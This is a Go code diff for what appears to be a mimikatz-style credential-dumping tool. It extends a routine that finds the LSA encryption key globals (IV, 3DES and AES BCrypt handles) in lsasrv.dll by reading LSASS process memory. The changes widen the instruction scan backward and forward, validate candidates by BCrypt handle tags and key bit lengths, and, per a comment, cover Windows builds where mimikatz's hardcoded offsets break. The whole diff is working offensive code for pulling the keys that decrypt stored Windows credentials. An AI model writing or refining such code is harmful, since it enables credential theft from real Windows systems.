@@ -34,6 +34,7 @@ import (
 	"encoding/binary"
 	"encoding/hex"
 	"fmt"
+	"strings"
 )
 
 // LsaInitProtectedMemoryWin10W8Signature is the byte pattern bracketing the
@@ -190,10 +191,22 @@ func findLsaCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, layout lsaCryp
 	}, nil
 }
 
+type cryptoScanCandidate struct {
+	instrOff  int
+	targetOff int
+	handlePtr uint64
+	bits      uint32
+}
+
 // scanCryptoGlobals dynamically finds the three crypto global references near
 // a LsaInitializeProtectedMemory pattern match. It scans for RIP-relative
 // MOV/LEA instructions and validates candidates by checking for the BCrypt
-// 'UUUR' handle tag in the module's data section.
+// 'UUUR' handle tag via LSASS process memory reads.
+//
+// The scanner works bidirectionally: it scans backward 600 bytes and forward
+// 200 bytes from the pattern to cover function bodies that were shifted by
+// cumulative Windows updates (e.g., Server 2019 build 17763.3650 where
+// mimikatz's hardcoded offsets are wrong).
 func scanCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, hit, patLen int, reader lsassReader) (lsaCryptoGlobals, error) {
 	bufLen := len(lsasrvBytes)
 
@@ -220,64 +233,70 @@ func scanCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, hit, patLen int, 
 		return lsaCryptoGlobals{}, fmt.Errorf("no RIP-relative LEA/MOV found within 50 bytes after pattern at offset %d", hit)
 	}
 
-	// Scan backward from the pattern for RIP-relative MOV/LEA instructions
-	// whose targets are global variables containing BCrypt handle pointers.
-	// The globals are in lsasrv.dll's .data section, but the handles they
-	// point to are heap-allocated, so we validate by reading through LSASS
-	// process memory.
-	type validatedKey struct {
-		instrOff  int
-		targetOff int
-		handlePtr uint64
-	}
-	var keyGlobals []validatedKey
+	// Scan both backward AND forward from the pattern for RIP-relative
+	// MOV/LEA instructions whose targets are global variables containing
+	// BCrypt handle pointers. The globals are in lsasrv.dll's .data section,
+	// but the handles they point to are heap-allocated, so we validate by
+	// reading through LSASS process memory.
+	//
+	// Scan ranges: 600 bytes backward, 200 bytes forward from pattern end.
+	// This covers the full LsaInitializeProtectedMemory function body even
+	// when cumulative updates have shifted the instruction layout.
+	var keyGlobals []cryptoScanCandidate
 	seen := make(map[int]bool)
-	scanStart := hit - 300
-	if scanStart < 0 {
-		scanStart = 0
-	}
-	for off := hit - 4; off >= scanStart; off-- {
+
+	// Data section heuristic: the .text section occupies the lower portion
+	// of the PE image. Use bufLen/4 as the threshold to avoid filtering out
+	// globals in DLLs with large code sections.
+	dataSectionThreshold := bufLen / 4
+
+	validateCandidate := func(off int) {
 		if !isRIPRelativeMOVorLEA(lsasrvBytes, off) {
-			continue
+			return
 		}
 		target, _, ok := resolveRIPRelative(lsasrvBytes, off, 3, 7)
 		if !ok || target < 0 || target+8 > bufLen {
-			continue
+			return
 		}
 		if seen[target] {
-			continue
+			return
 		}
 		seen[target] = true
 
-		// Target must be in the module's data section (high offsets)
-		if target < bufLen/2 {
-			continue
+		if target < dataSectionThreshold {
+			return
 		}
 
 		globalAddr := lsasrvBase + uintptr(target)
 
-		// Validate: read the pointer from the global, then check for UUUR tag
 		var handlePtrVal uint64
+		var bits uint32
 		if reader != nil {
 			ptrBytes, err := reader.Read(globalAddr, 8)
 			if err != nil || len(ptrBytes) < 8 {
-				continue
+				return
 			}
 			handlePtrVal = binary.LittleEndian.Uint64(ptrBytes)
 			handleAddr := uintptr(handlePtrVal)
 			if handleAddr == 0 || handleAddr < 0x10000 {
-				continue
+				return
 			}
-			// Read the BCrypt handle header to check for 'UUUR' tag
 			handleBytes, err := reader.Read(handleAddr, uint32(bcryptHandleKeySize))
 			if err != nil || len(handleBytes) < bcryptHandleKeySize {
-				continue
+				return
 			}
 			tag := binary.LittleEndian.Uint32(handleBytes[bcryptHandleKeyTagOff : bcryptHandleKeyTagOff+4])
 			if tag != bcryptHandleKeyTagWant {
-				continue
+				return
 			}
-			// Ensure distinct BCrypt handles (not the same global twice)
+			// Read the key81 to get the bit length for distinguishing 3DES vs AES
+			keyAddr := uintptr(binary.LittleEndian.Uint64(handleBytes[bcryptHandleKeyKeyOff : bcryptHandleKeyKeyOff+8]))
+			if keyAddr != 0 && keyAddr >= 0x10000 {
+				key81Bytes, err := reader.Read(keyAddr, bcryptHardKeyDataOff)
+				if err == nil && len(key81Bytes) >= bcryptHardKeyDataOff {
+					bits = binary.LittleEndian.Uint32(key81Bytes[0x18:0x1C])
+				}
+			}
 			isDup := false
 			for _, existing := range keyGlobals {
 				if existing.handlePtr == handlePtrVal {
@@ -286,33 +305,82 @@ func scanCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, hit, patLen int, 
 				}
 			}
 			if isDup {
-				continue
+				return
 			}
 		}
 
-		keyGlobals = append(keyGlobals, validatedKey{off, target, handlePtrVal})
+		keyGlobals = append(keyGlobals, cryptoScanCandidate{off, target, handlePtrVal, bits})
+	}
+
+	// Pass 1: scan backward from pattern (600 bytes)
+	scanBackStart := hit - 600
+	if scanBackStart < 0 {
+		scanBackStart = 0
+	}
+	for off := hit - 4; off >= scanBackStart; off-- {
+		validateCandidate(off)
 		if len(keyGlobals) >= 2 {
 			break
 		}
 	}
 
+	// Pass 2: scan forward from pattern end (200 bytes) if still need keys
+	if len(keyGlobals) < 2 {
+		fwdEnd := hit + patLen + 200
+		if fwdEnd > bufLen-7 {
+			fwdEnd = bufLen - 7
+		}
+		for off := hit + patLen; off < fwdEnd; off++ {
+			validateCandidate(off)
+			if len(keyGlobals) >= 2 {
+				break
+			}
+		}
+	}
+
 	// Always include hex dump for diagnostics when scanner is used
-	dumpStart := hit - 100
+	dumpStart := hit - 200
 	if dumpStart < 0 {
 		dumpStart = 0
 	}
+	dumpEnd := hit + patLen + 50
+	if dumpEnd > bufLen {
+		dumpEnd = bufLen
+	}
 	hexDump := hex.EncodeToString(lsasrvBytes[dumpStart:hit])
+	hexPost := hex.EncodeToString(lsasrvBytes[hit:dumpEnd])
 
 	if len(keyGlobals) < 2 {
-		return lsaCryptoGlobals{}, fmt.Errorf("found %d distinct BCrypt key globals (need 2) scanning 300 bytes before pattern at offset %d; pre-pattern hex (100 bytes): %s",
-			len(keyGlobals), hit, hexDump)
+		return lsaCryptoGlobals{}, fmt.Errorf("found %d distinct BCrypt key globals (need 2) scanning hit=%d (back 600, fwd 200); found=[%s]; pre-pattern hex (200B): %s; pattern+post hex: %s",
+			len(keyGlobals), hit, formatValidatedKeys(keyGlobals, lsasrvBase), hexDump, hexPost)
+	}
+
+	// Order by key size: 3DES (bits=168, 24 bytes) first, AES (bits=256, 32 bytes) second.
+	// If bits info unavailable, keep discovery order (backward scan finds closest first).
+	desIdx, aesIdx := 0, 1
+	if len(keyGlobals) >= 2 {
+		if keyGlobals[0].bits == 256 && keyGlobals[1].bits == 168 {
+			desIdx, aesIdx = 1, 0
+		}
 	}
 
 	return lsaCryptoGlobals{
 		IVAddr:       lsasrvBase + uintptr(ivOff),
-		H3DesKeyAddr: lsasrvBase + uintptr(keyGlobals[0].targetOff),
-		HAesKeyAddr:  lsasrvBase + uintptr(keyGlobals[1].targetOff),
+		H3DesKeyAddr: lsasrvBase + uintptr(keyGlobals[desIdx].targetOff),
+		HAesKeyAddr:  lsasrvBase + uintptr(keyGlobals[aesIdx].targetOff),
 	}, nil
+}
+
+func formatValidatedKeys(keys []cryptoScanCandidate, base uintptr) string {
+	if len(keys) == 0 {
+		return "none"
+	}
+	parts := make([]string, len(keys))
+	for i, k := range keys {
+		parts[i] = fmt.Sprintf("instr@%d→global@0x%X(off=%d,bits=%d,handle=0x%X)",
+			k.instrOff, base+uintptr(k.targetOff), k.targetOff, k.bits, k.handlePtr)
+	}
+	return strings.Join(parts, ", ")
 }
 
 // isRIPRelativeMOVorLEA checks if the 3 bytes at `off` in `buf` form the
